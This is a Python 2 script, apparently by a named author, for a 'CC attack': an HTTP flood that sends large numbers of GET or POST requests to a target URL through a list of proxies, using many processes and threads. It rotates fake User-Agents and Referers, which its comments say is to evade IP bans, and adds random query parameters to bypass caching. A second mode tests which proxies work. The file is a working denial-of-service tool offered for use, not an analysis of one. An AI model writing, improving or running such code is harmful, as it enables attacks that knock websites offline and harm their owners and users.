#!/usr/bin/env python
# author: xiaoL-pkav http://xlixli.net
# -*- coding: utf-8 -*-

import requests
import threading
import argparse
import time
import sys
import os
import random
import string

from multiprocessing import Process
from multiprocessing import Pool as ProcessPool
from multiprocessing.dummy import Pool as ThreadPool


UserAgent = [
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1) Gecko/20070803 Firefox/1.5.0.12',
'Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en) Opera 8.0',
'Opera/8.0 (Macintosh; PPC Mac OS X; U; en)',
'Opera/9.27 (Windows NT 5.2; U; zh-cn)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6',
'Mozilla/5.0 (iPhone; U; CPU like Mac OS X) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3',
'Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13'
]

spiderUserAgent =['zspider/0.9-dev http://feedback.redkolibri.com/',
'Xaldon_WebSpider/2.0.b1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)',
'Mozilla/5.0 (compatible; Speedy Spider; http://www.entireweb.com/about/search_tech/speedy_spider/)',
'Speedy Spider (Entireweb; Beta/1.3; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Entireweb; Beta/1.2; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Entireweb; Beta/1.1; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Entireweb; Beta/1.0; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Beta/1.0; www.entireweb.com)',
'Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)',
'Speedy Spider (http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (http://www.entireweb.com)',
'Sosospider+(+http://help.soso.com/webspider.htm)',
'sogou spider',
'Nusearch Spider (www.nusearch.com)',
'nuSearch Spider (compatible; MSIE 4.01; Windows NT)',
'lmspider (lmspider@scansoft.com)',
'lmspider lmspider@scansoft.com',
'ldspider (http://code.google.com/p/ldspider/wiki/Robots)',
'iaskspider/2.0(+http://iask.com/help/help_index.html)',
'iaskspider',
'hl_ftien_spider_v1.1',
'hl_ftien_spider',
'FyberSpider (+http://www.fybersearch.com/fyberspider.php)',
'FyberSpider',
'everyfeed-spider/2.0 (http://www.everyfeed.com)',
'envolk[ITS]spider/1.6 (+http://www.envolk.com/envolkspider.html)',
'envolk[ITS]spider/1.6 ( http://www.envolk.com/envolkspider.html)',
'Baiduspider+(+http://www.baidu.com/search/spider_jp.html)',
'Baiduspider+(+http://www.baidu.com/search/spider.htm)',
'BaiDuSpider',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
]

def get_parse():
	parser = argparse.ArgumentParser(description='xiaoL cc attack !')
	parser.add_argument('-c', help="Check agent availability , number of threads used. for example: -c 100", action="store", dest="c" , default=0, type=int)
	parser.add_argument('-u', help="url or ip. for example: -u 'http://xlixli.net/?s=xiaol' ", action="store", dest="u")
	parser.add_argument('-j', help="number of total jobs, default number 100000 .for example: -j 1000000", action="store", dest="j", default=1, type=int)
	parser.add_argument('-p', help="number of Processes, default Processes 5 .for example: -p 2", action="store", dest="p", default=1, type=int)
	parser.add_argument('-t', help="The number of threads, default 100 threads .for example: -t 100", action="store", dest="t", default=1 ,type=int)
	parser.add_argument('-m', help="Method, default GET .for example: -m GET", action="store", dest="m", default="GET")
	parser.add_argument('-d', help="Post data .for example: -d 'async=1&name=xiaol&passwd=adminadmin'", action="store", dest="d")
	if(len(sys.argv) < 2):
		parser.print_help()
		sys.exit()
	return parser.parse_args()

def Version():
	pass

def read_proxy():
	f = open('./proxy.txt', 'r')
	proxies = f.readlines()
	f.close()
	return proxies

'''
根据进程数平均分割代理
'''
def split_list(proxies , pnum):
	tmp_proxy = []
	for i in range(0, len(proxies), len(proxies)/ pnum):
		b = proxies[i: i + len(proxies) / pnum]
		tmp_proxy.append(b)
	return tmp_proxy

'''
构造上传HTTP包头
'''
def make_headers():
	tmp_header = {}
	tmp_header['User-Agent'] = random.choice(UserAgent)
	tmp_header['Referer'] = 'http://www.baidu.com'
	tmp_header['Cache-Control'] = 'no-cache'
	return tmp_header

'''
构造上传HTTP的POST数据包
'''
def make_data(post):
	tmp_post = {}
	tmp_data = post.split("&")
	for i in tmp_data:
		tmp_arr = i.split("=")
		tmp_post[tmp_arr[0]] = tmp_arr[1]
	print tmp_post
	return tmp_post

'''
生成随机参数
'''
def random_parameters(url):
	items = ['1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
	randomstring = string.join(random.sample(items, 10)).replace(" ","")
	if url.find('?') >= 0:		
		url = url + "&_random=" + randomstring
	else:
		url = url + "/?_random=" + randomstring
	return url

'''
CC主线程
'''
def cc_website((proxy, url, jobs, method, post)):
	theader = {}
	#生成http头部，防止封杀IP
	theader = make_headers()
	tmp_proxy = {}
	tmp_proxy['http'] = 'http://%s' % (proxy.strip())
	tmp_proxy['https'] = 'https://%s' % (proxy.strip())
	data_post = {}
	if method.upper == 'POST':		
		data_post = make_data(post)
	while jobs > 0:
		#生成随机参数，防止缓存
		tmp_url = random_parameters(url)
		if method.upper() == 'POST':
			try:
				getrequests = requests.post(tmp_url, headers= theader, proxies = tmp_proxy ,data = data_post ,timeout = 10)
				if getrequests.status_code == 200:
					print 'Attack website %s success' % (tmp_url)
					print 'Use proxy %s success' % (proxy.strip())
			except Exception, e:
				pass
		elif method.upper() == 'GET':
			try:
				getrequests = requests.get(tmp_url, headers= theader, proxies = tmp_proxy ,timeout = 10)
				if getrequests.status_code == 200:
					print 'Attack website %s success' % (tmp_url)
					print 'Use proxy %s success' % (proxy.strip())
			except Exception, e:
				pass
		jobs -= 1	

'''
cc主函数-新建测试线程
'''
def mk_threading(proxies, url ,jobs, threadnum ,method ,post):
	threadsPool = ThreadPool(threadnum)
	try:
		result = threadsPool.map(cc_website , map(lambda x:(x, url, jobs, method, post), proxies)) #关键操作
		threadsPool.close()
		threadsPool.join()
	except Exception, e:
		pass

'''
cc主函数-新建测试进程
'''
def mk_process(proxies, url ,jobs, processnum, threadnum ,method ,post):
	Processpools = ProcessPool(processnum)
	for i in range(processnum):
		Processpools.apply_async(mk_threading, args=(proxies[i], url ,jobs, threadnum ,method ,post))
	print 'CC start...'
	print 'Waiting for all subprocesses done...'
	Processpools.close()
	Processpools.join()
	print 'All subprocesses done.'

'''
cc主函数
'''
def attack_cc(url ,jobs, processnum, threadnum ,method ,post):
	#
	#获取代理
	proxies = read_proxy()
	#代理根据进程数分组
	proxies = split_list(proxies , processnum)
	#建立进程
	mk_process(proxies, url ,jobs, processnum, threadnum ,method ,post)

'''
判断成功将代理写入文件。
格式:
127.0.0.1:8080
'''
def add_proxy(proxy):
	global profile
	profile.write(proxy)

'''
通过访问baidu.com目标判断状态码判断代理可用性。
'''
def check_proxy(proxy):
	tmp_proxy = {}
	tmp_proxy['http'] = 'http://%s' % (proxy.strip())
	tmp_proxy['https'] = 'https://%s' % (proxy.strip())
	url = 'www.baidu.com'
	try:
		getrequests = requests.get("http://"+url+"/", proxies = tmp_proxy , timeout=10)
		if getrequests.status_code == 200:
			if getrequests.content.find(url) != -1:
				print 'Add proxy %s success' % (proxy.strip())
				add_proxy(proxy)
	except Exception, e:
		pass

'''
读取目录文件代理，多线程判断代理可用性。
'''
def check_proxies(num):
	global profile
	proxies = read_proxy()
	proxies = list(set(proxies));
	profile = open('./proxy.txt', 'w')
	threadsPool = ThreadPool(num)
	result = threadsPool.map(check_proxy, proxies)
	threadsPool.close()
	threadsPool.join()

'''
一个简单的测试函数
'''
def test():
	theader = {}
	#生成http头部，防止封杀IP
	theader = make_headers()
	tmp_proxy = {}
	tmp_proxy['http'] = 'http://c.com:3127' 
	getrequests = requests.get("http://xlixli.net/test.php", proxies = tmp_proxy)
	print getrequests.content


def main(argv):
	args = get_parse()
	if args.c != 0:
		check_proxies(args.c)
	else:
		attack_cc(args.u, args.j, args.p, args.t ,args.m ,args.d)

if __name__ == '__main__':	
	main(sys.argv)